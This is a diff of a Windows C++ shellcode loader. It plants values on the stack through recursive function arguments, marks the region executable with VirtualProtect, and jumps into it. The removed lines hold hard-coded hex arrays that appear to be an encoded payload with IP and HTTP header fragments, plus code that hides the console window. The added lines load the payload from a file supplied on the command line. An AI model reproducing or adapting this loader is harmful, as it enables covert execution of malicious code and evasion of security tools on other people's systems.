@@ -1,63 +1,84 @@
 ﻿#include <windows.h>
 #include <stdio.h>
 #include "CmdlineParser.hpp"
+#include "StackArgTool.hpp"
 
 using namespace std;
 
+#ifdef _M_IX86
+	#define T DWORD
+	#define PT PDWORD
+#else
+	#define T QWORD
+	#define PT QWORD*
+#endif
+
 void(*p_func)();
-
-int stackActualCount = 34;
-int stackFillCount = 830;
-int stackTotal = stackActualCount + stackFillCount;
-DWORD arg0[] = { 0x00000000, 0x33312e30, 0x01078bc6, 0x5351d901, 0x00100068, 0x24b33f47, 0x590efdad, 0x53541f82, 0xd358c45a, 0x6f92e0a3, 0x5ce0734b, 0x892c76b8, 0x46911439, 0xca590165, 0x5689800a, 0x696c4320, 0x67412d65, 0x2d726573, 0xfaa3b283, 0x4c7d4203, 0x8ee60d6c, 0x000191e9, 0x51076a57, 0xf9890474, 0x53ff6a57, 0x52844002, 0x50685151, 0x57575757, 0x5d86eb12, 0x8bd3011c, 0xf475e038, 0x20588b18, 0x5752f0e2, 0x28728b14 };
-DWORD arg1[] = { 0x00000000, 0x2e383631, 0x74c085d5, 0x00000000, 0x406ad5ff, 0x58efd1e9, 0x1b8203f1, 0x8acb02bd, 0xeadcf1e8, 0x584a221c, 0x9b01166c, 0x31b33272, 0x09119586, 0xe58663a4, 0x000a0d30, 0x34383336, 0x74616470, 0x55006d31, 0x321b2cfd, 0x81012c75, 0x246fde00, 0xff31b774, 0xff31d5ff, 0xf685ff31, 0x57ff3150, 0x006852d2, 0x036a5151, 0xff31d5ff, 0x8b5a5f58, 0x588b4b0c, 0xc7010dcf, 0x488b50d0, 0xc7010dcf, 0x528b0c52 };
-DWORD arg2[] = { 0x00000000, 0x2e323931, 0xffe28996, 0xb993d5ff, 0x56a2b5f0, 0x9e83db59, 0x1fbc351c, 0x50356f49, 0x4062e9fb, 0x9a9ac4e1, 0x71e2fd94, 0x09c2b8fa, 0xb008e0ae, 0x06f7a4a4, 0x342e312f, 0x312e3131, 0x552d7377, 0xc2f12100, 0x4ca2b523, 0xc663b61e, 0x42525276, 0xc7390000, 0x315e2145, 0x000001c3, 0xc383c689, 0x315b70eb, 0xc9315b00, 0x0726774c, 0xe0ff515a, 0x8b66d301, 0xc1acc031, 0x014a74c0, 0xc1202c02, 0x8b30528b };
-DWORD arg3[] = { 0x00000000, 0xfffffda9, 0x12685653, 0xe553a458, 0x68004016, 0x08a01a0e, 0xdf6782b3, 0x03a0c297, 0xf0f4c228, 0xd844f008, 0x9084fa6a, 0xbb3bde60, 0x5e0f2fba, 0x508d8af1, 0x6c6f636f, 0x3030312e, 0x6f646e69, 0x20426ed8, 0x7eb47512, 0x68406623, 0x2fffffff, 0x2f00bfd5, 0x68c189d5, 0x840fc085, 0xd5ff3b2e, 0xd5ffc69f, 0x000084e9, 0x6854696e, 0x59615b5b, 0x24588b58, 0xff31d601, 0x8578408b, 0x7c613cac, 0x64d231e5 };
-DWORD arg4[] = { 0x00007856, 0xe8c358e5, 0x00002000, 0x68570040, 0x077247bc, 0x2a5f11d3, 0xa1e0fce5, 0x4cf41531, 0x6454ec91, 0x3c5965e6, 0xbd6fd0e6, 0x901a56da, 0xbdcf4bf0, 0x687b134b, 0x746f7250, 0x302e3031, 0x57203a74, 0xa1979f7d, 0x5c600dc6, 0xda1b6443, 0x8be80000, 0xff0be057, 0xff5de2c5, 0xd5ff7b18, 0x55eb6850, 0x89576850, 0xd5ffa779, 0x69776800, 0x24244489, 0xe275247d, 0x8b348b49, 0xd0013c42, 0xc031ff31, 0x89600000 };
-DWORD arg5[] = { 0x34120036, 0x75c085c3, 0x6857e789, 0x00006800, 0xd4714738, 0x60d268ea, 0xad87ccdb, 0x1cd4193f, 0x8502ebe2, 0xfe455c2b, 0xee591e22, 0x34305b98, 0xe1d54e90, 0x4989ef27, 0x2d746e65, 0x2f746e65, 0x6e656741, 0x4081c389, 0x27336fc8, 0x2bb2f246, 0x01c9e900, 0xb7685056, 0xaa6809eb, 0x062d6856, 0x52535252, 0x53000000, 0x563a6857, 0x74656e68, 0xd0018b04, 0x3bf87d03, 0x3ce3d301, 0x8b10528b, 0x264ab70f, 0x0089e8fc };
-
 
 int stackCount = 0;
 int stackActualIndex = -1;
-DWORD beginAddress;
+T beginAddress;
+StackArg* stack;
 
-void test(DWORD a, DWORD b, DWORD c, DWORD d)
+void test(T a, T b, T c, T d)
 {
 	stackCount++;
 	
-	if (stackCount == stackTotal) {
-		beginAddress = (DWORD)((PDWORD)&a) - 8;
+	if (stackCount == stack->stackTotal) {
+#ifdef _M_IX86
+		beginAddress = (T)((PT)&a) - stack->typeLength * 2;
+#else
+		beginAddress = (T)((PT)&a) - stack->typeLength * 1;
+#endif
 	}
-	else if (stackCount < stackFillCount) {
+	else if (stackCount < stack->fillCount) {
 		test(0, 0, 0, 0);
 	}
-	else if(stackCount < stackTotal){
+	else if(stackCount < stack->stackTotal){
 		stackActualIndex++;
-		test(arg3[stackActualIndex], arg2[stackActualIndex], arg1[stackActualIndex], arg0[stackActualIndex]);
+#ifdef _M_IX86
+		test(stack->m_values[3][stackActualIndex], stack->m_values[2][stackActualIndex], stack->m_values[1][stackActualIndex], stack->m_values[0][stackActualIndex]);
+#else
+		test(stack->m_values[14][stackActualIndex], stack->m_values[13][stackActualIndex], stack->m_values[12][stackActualIndex], stack->m_values[11][stackActualIndex]);
+#endif
 	}
 }
 
 int main()
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
-
 	LPSTR lpcmdline = GetCommandLineA();
 	std::string strCmdLine = (lpcmdline == nullptr ? "" : lpcmdline);
 	CmdlineParser cmdLine(strCmdLine);
 
-	if (!cmdLine.hasParam("pid"))
+	if (!cmdLine.hasParam("f"))
 	{
 		return TRUE;
 	}
 
-	test(0, 0, 0, 0);
+	stack = new StackArg(cmdLine["f"].toString());
 
-	for (int i = stackTotal-1, index = 0; i >= stackFillCount; i--, index++) {
-		*(PDWORD)(beginAddress + index * 6 * 4) = arg5[i- stackFillCount];
-		*(PDWORD)(beginAddress+ index * 6 * 4 + 4) = arg4[i - stackFillCount];
+	if (stack->m_status) {
+		test(0, 0, 0, 0);
+
+		for (int i = stack->stackTotal - 1, index = 0; i >= stack->fillCount; i--, index++) {
+#ifdef _M_IX86
+			*(PT)(beginAddress + index * stack->argSum * stack->typeLength) = stack->m_values[5][i - stack->fillCount];
+			*(PT)(beginAddress + index * stack->argSum * stack->typeLength + stack->typeLength) = stack->m_values[4][i - stack->fillCount];
+#else
+			*(PT)(beginAddress + index * stack->argSum * stack->typeLength) = stack->m_values[stack->argSum - 1][i - stack->fillCount];
+			for (size_t j = 0; j <= 10; j++)
+			{
+				*(PT)(beginAddress + index * stack->argSum * stack->typeLength + stack->typeLength * (5+j)) = stack->m_values[stack->argSum - 1 - 5-j][i - stack->fillCount];
+			}
+#endif
+		}
+#ifndef _M_IX86
+		DWORD dwFalg;
+		int status = VirtualProtect((LPVOID)beginAddress, 0x2000, 0x20, &dwFalg);
+#endif
+
+		p_func = (void(*)())(beginAddress);
+
+		p_func();
 	}
-	
-	p_func = (void(*)())(beginAddress);
-
-	p_func();
 }
